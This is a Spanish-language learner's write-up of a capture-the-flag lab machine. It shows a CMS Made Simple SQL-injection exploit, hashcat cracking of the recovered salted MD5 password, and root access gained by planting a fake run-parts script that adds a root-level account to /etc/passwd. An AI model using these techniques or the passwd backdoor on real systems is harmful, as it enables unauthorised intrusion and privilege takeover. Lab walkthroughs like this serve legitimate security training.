Puertos abiertos![[Pasted image 20250414122524.png]]

la pagina principal es esta ![[Pasted image 20250414122605.png]]


en el escaneo con nmap nos chiva que tiene robots.txt
 en robots tenemos esto #              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
 
 Esa url demomento lleva a este sitio ![[Pasted image 20250414122805.png]]
 estamos en http://10.10.10.138/writeup/
 en el codigo fuente encontramos ![[Pasted image 20250414123424.png]]
 CMS MADE SIMPLE pero bueno demomento tmp sabemos que version tenemos ni nada 
 
 buscando un poco encontramos una inyeccion sql bling ejecutando un codigo de un github parece que nos da credenciales correctas 
 he tenido que mirar el writeup original iba por buen camino pero no le habia proporcionado bien la url https://github.com/ELIZEUOPAIN/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit
 
 ┌──(venv)─(root㉿kali)-[/home/kali/writeup/CVE-2019-9053-CMS-Made-Simple-2.2.10---SQL-Injection-Exploit]
└─# python3 cve.py   -uhttp://10.10.10.138/ --crack -w best110.txt


[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeupl
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
                                                               
┌──(venv)─(root㉿kali)-[/home/kali/writeup/CVE-20

la contrasena es un hash que esta en MD5+ salt no tengo ni idea de lo que  es salt luego lo mirare mas en detallle 

5a599ef579066807raykayjay9 me ha dado esto en una pagina web decodeanla voy a crackearla con hascat a ver si me da lo mismo 

hashcat -m 20 -a 0 hash.txt wordlist.txt

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807
Time.Started.....: Mon Apr 14 10:28:16 2025 (1 sec)
Time.Estimated...: Mon Apr 14 10:28:17 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6350.9 kH/s (0.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4362240/14344385 (30.41%)
Rejected.........: 0/4362240 (0.00%)
Restore.Point....: 4359680/14344385 (30.39%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: raylan34 -> ray061
Hardware.Mon.#1..: Util: 29%


he tenido que mirar el writeup porque no tenia sentido estaba intentando hacer login en 


http://10.10.10.138/writeup/admin/

jkr:raykayjay9 son para acceder por ssh

la escalacion de privilegios es complicada porque no tiene sudo de primeras tenemos estos usuarios con sus ids
 jkr@writeup:~$ id
uid=1000(jkr) gid=1000(jkr) groups=1000(jkr),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),50(staff),103(netdev)
jkr@writeup:~$ 

staff es
.bash_history  .bash_logout   .bashrc        .nano/         .profile       pspy32         pspy64         user.txt       
jkr@writeup:~$ chmod +x pspy32
jkr@writeup:~$ ./pspy64 
 estoy ejecutando este archivo que se supone que saca todas las tareas que haya en el crontab pero no veo la que deberia de ver 
 
 ![[Pasted image 20250414175213.png]]
 ahora si que se ve el proceso que buscamos es este 
 run-parts --lsbsysinit /etc/update-motd.d 
2025/04/14 11:53:32 CMD: UID=0     PID=2293   | uname -rnsom 

run-parts exactamente por lo que estoy leyendo nose que hace este binario exactamente pero bueno no tengo acceso a ver que binarios hay pero si lo esta llamando de forma indirecta es porque tiene que estar dentro de el archivo de binarios 

hacemos esto para crear un nuevo usuario jkr@writeup:/tmp$ nano /usr/local/bin/run-parts
jkr@writeup:/tmp$ cat /usr/local/bin/run-parts
#!/bin/bash
echo 'deejay:$1$deejay$4bbVUrgoKNqATEsKbF2d.0:0:0:root:/root:/bin/bash' >> /etc/passwd
jkr@writeup:/tmp$ 



hay que llamar ahora al proceso asique entramos por ssh
![[Pasted image 20250414180202.png]]


y ya seriamos root ![[Pasted image 20250414180238.png]]